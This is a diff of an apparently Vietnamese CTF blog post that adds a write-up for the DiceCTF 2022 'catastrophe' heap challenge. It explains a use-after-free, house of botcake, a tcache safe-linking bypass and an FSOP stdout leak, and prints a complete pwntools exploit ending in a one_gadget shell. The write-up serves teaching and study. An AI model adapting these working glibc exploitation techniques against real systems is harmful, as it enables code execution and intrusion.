@@ -9,6 +9,7 @@ layout: post
 
 - FSOP là 1 kĩ thuật tấn công cấu trúc của ```IO_FILE``` , có rất nhiều bài viết về kĩ thuật này ở google , ta có thể đọc 1 bài viết bằng tiếng việt ở đây [here](https://hackmd.io/@kyr04i/SkF_A-fnn) ... 
 
+file [here](/assets/files/GlacierCTF.2023.7z)
 ## Write.Byte.Where
 
 
@@ -255,7 +256,7 @@ p.interactive()
 
 1 cách khác 
 
-```pythonpython
+```python
 #!/usr/bin/env python3
 
 from pwn import *
@@ -338,3 +339,559 @@ p.interactive()
 ```
 
 ref : [>=libc2.35](https://hareh4ru.github.io/pwn/2023/11/23/FSOP-for-libc-2.35-and-over.html)
+
+
+
+## catastrophe
+
+file [here](/assets/files/dice-2022.7z)
+### overview
+
+checksec : full giáp
+
+```cs
+ploi@PhuocLoiiiii:~/pwn/FSOP/dice-2022$ checksec catastrophe
+[*] '/home/ploi/pwn/FSOP/dice-2022/catastrophe'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+- ta có 3 option chính ở bài này , ta sẽ cùng nhau đi phân tích nó 
+
+```cs
+int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
+{
+  unsigned __int64 number; // rax
+
+  setbuf(stdout, 0LL);
+  setbuf(stdin, 0LL);
+  setbuf(stderr, 0LL);
+  while ( 1 )
+  {
+    print_menu();
+    number = get_number();
+    if ( number == 4 )
+    {
+      puts("Bye!");
+      exit(0);
+    }
+    if ( number <= 4 )
+    {
+      switch ( number )
+      {
+        case 3uLL:
+          op_view();
+          goto LABEL_13;
+        case 1uLL:
+          op_malloc();
+          goto LABEL_13;
+        case 2uLL:
+          op_free();
+          goto LABEL_13;
+      }
+    }
+    puts("Invalid choice!");
+LABEL_13:
+    putchar(10);
+  }
+}
+```
+
+- op-malloc:  ta được input 1 size <=0x200 và malloc , cuối cùng là nhập dữ liệu vào chunk  
+```cs
+int op_malloc()
+{
+  __int64 index; // [rsp+0h] [rbp-10h]
+  unsigned __int64 size; // [rsp+8h] [rbp-8h]
+
+  puts("Index?");
+  index = get_index();
+  puts("Size?");
+  size = get_number();
+  if ( !size || size > 0x200 )
+    return puts("Interesting...");
+  *((_QWORD *)&chonks + index) = malloc(size);
+  printf("Enter content: ");
+  return (unsigned int)fgets(*((char **)&chonks + index), size, stdin);
+}
+```
+
+- op_free: nhập 1 idx và free() , ở đây sẽ xảy ra bug ```UAF``` vì không xóa con trỏ
+
+```cs
+void op_free()
+{
+  __int64 index; // [rsp+8h] [rbp-8h]
+
+  puts("Index?");
+  index = get_index();
+  free(*((void **)&chonks + index));
+}
+```
+
+- op_view: nhập 1 idx và in dữ liệu của chunk[idx]
+
+```cs
+int op_view()
+{
+  __int64 index; // [rsp+8h] [rbp-8h]
+
+  puts("Index?");
+  index = get_index();
+  return puts(*((const char **)&chonks + index));
+}
+```
+
+- libc được sử dụng ở bài này là 2.35 (không dùng được hook , có tcache và Safe-linking)  , ta có thể xem cách ```safe-linking``` hoạt động ở [here](https://github.com/johnathanhuutri/CTFNote/tree/master/Heap-Exploitation)  , mặc khác ta cũng không thể overwrite được GOT , vậy cách mà ta suy nghĩ cuối cùng có lẽ là sử dụng ROP_CHAIN trên stack hoặc là ```exit_handle``` hoặc ```overwrite_got_libc``` tuy  nhiên thì ở bài này mình sẽ làm cách 1, vì vậy ta cần phải leak được địa chỉ stack , muốn leak stack thì ta phải leak libc trước để có ```environ``` và ta cũng cần leak heap để bypasss được ```safe-linking```
+- trước hết ta cần setup để có được ```libc_address``` và ```heap_address```
+
+
+```python
+for i in range(7): malloc(i,0x100,b'a')
+
+free(0)
+view(0)
+heap_base = u64(p.recv(5).ljust(8,b'\x00')) * 0x1000
+log.info(f'heap base: {hex(heap_base)}')
+```
+
+- tiếp theo ta chỉ việc malloc() lại , 3 chunk tiếp theo sẽ được sử dụng cho kỹ thuật ```house_of_botcake``` , đây là 1 phương pháp tấn công tcache_poisioning nhưng mạnh mẽ hơn , nó sử dụng hợp nhất chunk để tạo ra 1 double free trong tcache , ta có thể đọc ở đây [here](https://4xura.com/pwn/house-of-botcake/)
+
+- ta sẽ malloc 2 chunk 0x100 và 1 chunk để tránh gộp với top chunk , đồng thời ta sẽ free 8 chunk , chunk thứ 8 sẽ đi vào unsorted bin và ta có thể leak libc 
+
+```cs
+malloc(0,0x100,b'a')
+
+malloc(7,0x100,b'a')
+malloc(8,0x100,b'a')
+
+malloc(9,0x10,b'c')
+
+for i in range(7): free(i)
+free(7)
+view(7)
+libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x219ce0
+environ = libc.sym.environ
+binsh = next(libc.search(b'/bin/sh\x00'))
+stdout = libc.address + 0x21a780
+log.info(f'libc: {hex(libc.address)}')
+log.info(f'environ: {hex(environ)}')
+log.info(f'binsh: {hex(binsh)}')
+log.info(f'stdout: {hex(stdout)}')
+```
+
+- ta có thể thấy nó như sau , lúc này nếu ta free() chunk ở kế tiếp nó , nó sẽ đi tìm chunk free liền kề và 2 thằng này sẽ được hợp nhất với nhau 
+
+```cscs
+0x5558b5d9ca00  0x0000000000000000      0x0000000000000111      ................         <-- unsortedbin[all][0]
+0x5558b5d9ca10  0x00007f6eb4305ce0      0x00007f6eb4305ce0      .\0.n....\0.n...
+0x5558b5d9ca20  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9ca30  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9ca40  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9ca50  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9ca60  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9ca70  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9ca80  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9ca90  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9caa0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cab0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cac0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cad0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cae0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9caf0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb00  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb10  0x0000000000000110      0x0000000000000110      ................
+0x5558b5d9cb20  0x0000000000000a61      0x0000000000000000      a...............
+0x5558b5d9cb30  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb40  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb50  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb60  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb70  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb80  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb90  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cba0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cbb0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cbc0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cbd0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cbe0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cbf0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cc00  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cc10  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cc20  0x0000000000000000                              ........
+```
+
+- vậy ta sẽ làm được điều gì với điều này ?  
+
+```cs
+0x5558b5d9ca00  0x0000000000000000      0x0000000000000221      ........!.......         <-- unsortedbin[all][0]
+0x5558b5d9ca10  0x00007f6eb4305ce0      0x00007f6eb4305ce0      .\0.n....\0.n...
+0x5558b5d9ca20  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9ca30  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9ca40  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9ca50  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9ca60  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9ca70  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9ca80  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9ca90  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9caa0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cab0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cac0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cad0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cae0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9caf0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb00  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb10  0x0000000000000110      0x0000000000000110      ................
+0x5558b5d9cb20  0x0000000000000a61      0x0000000000000000      a...............
+0x5558b5d9cb30  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb40  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb50  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb60  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb70  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb80  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb90  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cba0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cbb0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cbc0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cbd0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cbe0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cbf0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cc00  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cc10  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cc20  0x0000000000000220      0x0000000000000020       ....... .......
+0x5558b5d9cc30  0x0000000000000a63      0x0000000000000000      c...............
+0x5558b5d9cc40  0x0000000000000000      0x00000000000203c1      ................         <-- Top chunk
+```
+
+ta hãy cùng xem trong bins lúc này , nếu ta malloc lại 1 chunk để lấy chunk entry_tcache ra và tiếp tục free() chunk thứ 8 thì lúc này cả 2 sẽ nằm ở các bin khác nhau đúng chứ? , vì vậy nếu ta malloc 1 chunk ở ```unsorted_bin``` với 1 kích thước vừa đủ , ta hoàn toàn có thể overwrite được ```fd``` của chunk thứ 8 
+
+```cs
+pwndbg> bins
+tcachebins
+0x110 [  7]: 0x5558b5d9c900 —▸ 0x5558b5d9c7f0 —▸ 0x5558b5d9c6e0 —▸ 0x5558b5d9c5d0 —▸ 0x5558b5d9c4c0 —▸ 0x5558b5d9c3b0 —▸ 0x5558b5d9c2a0 ◂— 0
+fastbins
+empty
+unsortedbin
+all: 0x5558b5d9ca00 —▸ 0x7f6eb4305ce0 ◂— 0x5558b5d9ca00
+smallbins
+empty
+largebins
+empty
+```
+- ta thấy lúc này nếu ta yêu cầu malloc với 1 chunk 0x130 , unsorted sẽ cắt 1 phần ra và ta đã ovewrite thành công được fd trong tcache , chú ý là nó sử dụng ```safe-linking``` nên ta cần mã hóa nó bằng cách ```target ^ (heap_base >> 12)```
+```cs
+0x5558b5d9ca00  0x0000000000000000      0x0000000000000141      ........A.......
+0x5558b5d9ca10  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
+0x5558b5d9ca20  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
+0x5558b5d9ca30  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
+0x5558b5d9ca40  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
+0x5558b5d9ca50  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
+0x5558b5d9ca60  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
+0x5558b5d9ca70  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
+0x5558b5d9ca80  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
+0x5558b5d9ca90  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
+0x5558b5d9caa0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
+0x5558b5d9cab0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
+0x5558b5d9cac0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
+0x5558b5d9cad0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
+0x5558b5d9cae0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
+0x5558b5d9caf0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
+0x5558b5d9cb00  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
+0x5558b5d9cb10  0x6161616161616161      0x0000000000000111      aaaaaaaa........
+0x5558b5d9cb20  0x00007f6be1bb3a1c      0x9966da748f80000a      .:..k.......t.f.         <-- tcachebins[0x110][0/7]
+0x5558b5d9cb30  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb40  0x0000000000000000      0x00000000000000e1      ................         <-- unsortedbin[all][0]
+0x5558b5d9cb50  0x00007f6eb4305ce0      0x00007f6eb4305ce0      .\0.n....\0.n...
+0x5558b5d9cb60  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb70  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb80  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cb90  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cba0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cbb0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cbc0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cbd0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cbe0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cbf0  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cc00  0x0000000000000000      0x0000000000000000      ................
+0x5558b5d9cc10  0x0000000000000000      0x0000000000000000      ................
+```
+
+- lúc này ta thấy ta đã overwrite thành công ```fd``` trong tcache và nó trỏ đến ```stdout``` , ta sẽ sử dụng ```FSOP``` để leak địa chỉ stack 
+
+```cs
+pwndbg> bins
+tcachebins
+0x110 [  7]: 0x5558b5d9cb20 —▸ 0x7f6eb4306780 (_IO_2_1_stdout_) ◂— 0x70d466b81
+fastbins
+empty
+unsortedbin
+all: 0x5558b5d9cb40 —▸ 0x7f6eb4305ce0 ◂— 0x5558b5d9cb40
+smallbins
+empty
+largebins
+empty
+```
+
+- ta thấy được sau khi các hàm được gọi , nó sẽ sử dụng ```putchar``` : 
+
+```cs
+ 0x7f6eb416ea62 <putchar+98>     mov    rdx, qword ptr [rdi + 0x28]     RDX, [_IO_2_1_stdout_+40] => 0x7f6eb430d208 ◂— 0
+   0x7f6eb416ea66 <putchar+102>    movzx  eax, bpl                        EAX => 0xa
+   0x7f6eb416ea6a <putchar+106>    cmp    rdx, qword ptr [rdi + 0x30]     0x7f6eb430d208 - 0x7f6eb430d208     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ]
+   0x7f6eb416ea6e <putchar+110>    jb     putchar+161                 <putchar+161>
+
+   0x7f6eb416ea70 <putchar+112>    mov    esi, eax                        ESI => 0xa
+ ► 0x7f6eb416ea72 <putchar+114>    call   __overflow                  <__overflow>
+        arg0: 0x7f6eb4306780 (_IO_2_1_stdout_) ◂— 0xfbad1800
+        arg1: 0xa
+
+   0x7f6eb416ea77 <putchar+119>    test   dword ptr [rbx], 0x8000
+   0x7f6eb416ea7d <putchar+125>    je     putchar+180                 <putchar+180>
+
+   0x7f6eb416ea7f <putchar+127>    add    rsp, 0x18
+   0x7f6eb416ea83 <putchar+131>    pop    rbx
+   0x7f6eb416ea84 <putchar+132>    pop    rbp
+```
+
+- tiếp theo là gọi  ```_IO_do_write```
+
+rdi là stdout , rsi là _IO_write_base , rdx là ```_IO_write_ptr - _IO_write_base```
+```cs
+ 0x7ffff7e1ff3e <_IO_file_overflow+254>    call   _IO_do_write                <_IO_do_write>
+        rdi: 0x7ffff7fad780 (_IO_2_1_stdout_) ◂— 0xfbad2887
+        rsi: 0x7ffff7fad803 (_IO_2_1_stdout_+131) ◂— 0xfaea70000000000a /* '\n' */
+        rdx: 1
+        rcx: 0xc00
+
+
+```
+- cuối cùng là 
+```
+ 0x7ffff7e1fa5d <_IO_do_write+173>    call   qword ptr [r14 + 0x78]      <_IO_file_write>
+        rdi: 0x7ffff7fad780 (_IO_2_1_stdout_) ◂— 0xfbad2887
+        rsi: 0x7ffff7fad803 (_IO_2_1_stdout_+131) ◂— 0xfaea70000000000a /* '\n' */
+        rdx: 1
+        rcx: 0xc00
+```
+
+- nói chung quá trình chi tiết ta cần đọc ở đây [here](https://zenn.dev/t0m3y/articles/d42397182c694d#fsop) , vậy ta sẽ setup như sau :
+
+```python
+payload = flat(
+        0xfbad1800,        # flags
+        libc.sym.environ,  #_IO_read_ptr
+        libc.sym.environ,  #_IO_read_ptr
+        libc.sym.environ,  #_IO_write_ptr
+        libc.sym.environ,   #_IO_write_base
+        libc.sym.environ+8, #_IO_write_ptr
+        libc.sym.environ+8, #_IO_write_end
+        libc.sym.environ+8, #_IO_buf_base
+        libc.sym.environ+8, #_IO_buf_end
+        )
+```
+
+- vậy ta sẽ ghi đè cấu trúc của ```stdout```  , và free() lại 2 chunk lúc nãy , lúc này ta đã có thể ghi tùy ý , ta sẽ tiếp tục malloc lại chunk có size 0x130 để overwrite ```fd``` của chunk kế tiếp nằm trong tcache
+
+```cs
+tcachebins
+0x110 [  6]: 0x55ecb48c0b20 ◂— 0x70a2de07f
+0x140 [  1]: 0x55ecb48c0a10 ◂— 0
+```
+
+- nó sẽ trông như sau: 
+
+
+```cs
+free(1)
+free(2)
+
+payload2 = flat(
+        b'a'*0x108 + p64(0x111) + p64(obfuscate(saved_rbp,heap_base))
+        )
+pop_rsi = libc.address + 0x0000000000126101
+pop_rdi = 0x000000000002a3e5
+pop_rdx_rbx = libc.address + 0x0000000000090529
+
+input()
+payload3 = p64(heap_base+0x78)
+payload3 += p64(pop_rsi) + p64(0)
+payload3 += p64(pop_rdx_rbx) + p64(0)*2
+payload3 += p64(0xebcf8+libc.address)  #rsi null , rdx null
+malloc(5,0x130,payload2)
+malloc(6,0x100,b'nothing')
+malloc(7,0x100,payload3)
+```
+
+- ở đây mình dùng one_gadget ```0xebcf8``` , ta cần setup ```rbp-0x78``` là 1 địa chỉ có thể ghi và ```rsi và rdx là NULL```
+
+
+```cs
+ploi@PhuocLoiiiii:~/pwn/FSOP/dice-2022/catastrophe/bin$ one_gadget libc.so.6
+0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
+constraints:
+  address rbp-0x78 is writable
+  [r10] == NULL || r10 == NULL || r10 is a valid argv
+  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
+
+0xebcf5 execve("/bin/sh", r10, rdx)
+constraints:
+  address rbp-0x78 is writable
+  [r10] == NULL || r10 == NULL || r10 is a valid argv
+  [rdx] == NULL || rdx == NULL || rdx is a valid envp
+
+0xebcf8 execve("/bin/sh", rsi, rdx)
+constraints:
+  address rbp-0x78 is writable
+  [rsi] == NULL || rsi == NULL || rsi is a valid argv
+  [rdx] == NULL || rdx == NULL || rdx is a valid envp
+
+0xebd52 execve("/bin/sh", rbp-0x50, r12)
+constraints:
+  address rbp-0x48 is writable
+  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
+  [r12] == NULL || r12 == NULL || r12 is a valid envp
+
+0xebda8 execve("/bin/sh", rbp-0x50, [rbp-0x70])
+constraints:
+  address rbp-0x48 is writable
+  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
+  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
+
+0xebdaf execve("/bin/sh", rbp-0x50, [rbp-0x70])
+constraints:
+  address rbp-0x48 is writable
+  rax == NULL || {rax, r12, NULL} is a valid argv
+  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
+
+0xebdb3 execve("/bin/sh", rbp-0x50, [rbp-0x70])
+constraints:
+  address rbp-0x50 is writable
+  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
+  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
+```
+
+FINALLY !!!
+
+![here](/assets/images/finally.png)
+
+full exp : 
+
+```
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./catastrophe_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+
+context.binary = exe
+
+p = process()
+
+def malloc(idx,size,data):
+    p.sendlineafter(b'> ',b'1')
+    p.sendlineafter(b'> ',f'{idx}'.encode())
+    p.sendlineafter(b'> ',f'{size}'.encode())
+    p.sendlineafter(b'content: ',data)
+
+def free(idx):
+    p.sendlineafter(b'> ',b'2')
+    p.sendlineafter(b'> ',f'{idx}'.encode())
+
+def view(idx):
+    p.sendlineafter(b'> ',b'3')
+    p.sendlineafter(b'> ',f'{idx}'.encode())
+def obfuscate(p, adr):
+    return p^(adr>>12)
+
+
+for i in range(7): malloc(i,0x100,b'a')
+
+free(0)
+view(0)
+heap_base = u64(p.recv(5).ljust(8,b'\x00')) * 0x1000
+log.info(f'heap base: {hex(heap_base)}')
+
+malloc(0,0x100,b'a')
+
+malloc(7,0x100,b'a')
+malloc(8,0x100,b'a')
+
+malloc(9,0x10,b'c')
+
+for i in range(7): free(i)
+free(7)
+view(7)
+libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x219ce0
+environ = libc.sym.environ
+binsh = next(libc.search(b'/bin/sh\x00'))
+stdout = libc.address + 0x21a780
+log.info(f'libc: {hex(libc.address)}')
+log.info(f'environ: {hex(environ)}')
+log.info(f'binsh: {hex(binsh)}')
+log.info(f'stdout: {hex(stdout)}')
+
+free(8)
+malloc(0,0x100,b'a')
+free(8)
+# overwrite fd
+payload = b'a'*0x108 + p64(0x111) + p64(obfuscate(stdout,heap_base))
+malloc(1,0x130,payload)
+malloc(2,0x100,b'nothing')
+
+payload = flat(
+        0xfbad1800,
+        libc.sym.environ,
+        libc.sym.environ,
+        libc.sym.environ,
+        libc.sym.environ,
+        libc.sym.environ+8,
+        libc.sym.environ+8,
+        libc.sym.environ+8,
+        libc.sym.environ+8,
+        )
+
+malloc(3,0x100,payload)
+environ_stack = u64(p.recv(6).ljust(8,b'\x00'))
+saved_rbp = environ_stack - 0x138
+saved_rip = environ_stack - 0x130
+log.info(f'stack_leak: {hex(environ_stack)}')
+log.info(f'saved_rbp: {hex(saved_rbp)}')
+log.info(f'saved_rip: {hex(saved_rip)}')
+
+
+
+input()
+free(1)
+free(2)
+
+payload2 = flat(
+        b'a'*0x108 + p64(0x111) + p64(obfuscate(saved_rbp,heap_base))
+        )
+pop_rsi = libc.address + 0x0000000000126101
+pop_rdi = 0x000000000002a3e5
+pop_rdx_rbx = libc.address + 0x0000000000090529
+
+input()
+payload3 = p64(heap_base+0x78)
+payload3 += p64(pop_rsi) + p64(0)
+payload3 += p64(pop_rdx_rbx) + p64(0)*2
+payload3 += p64(0xebcf8+libc.address)  #rsi null , rdx null
+malloc(5,0x130,payload2)
+malloc(6,0x100,b'nothing')
+malloc(7,0x100,payload3)
+
+p.interactive()
+```
+
+ref : 
+
+[1 bài kĩ thuật tương tự](https://ret2school.github.io/post/mailman/)
+
+[1 writeup khác](https://zenn.dev/t0m3y/articles/d42397182c694d#fsop)
+
+[safe_linking](https://fascinating-confusion.io/posts/2020/11/csr20-howtoheap-writeup/)
+
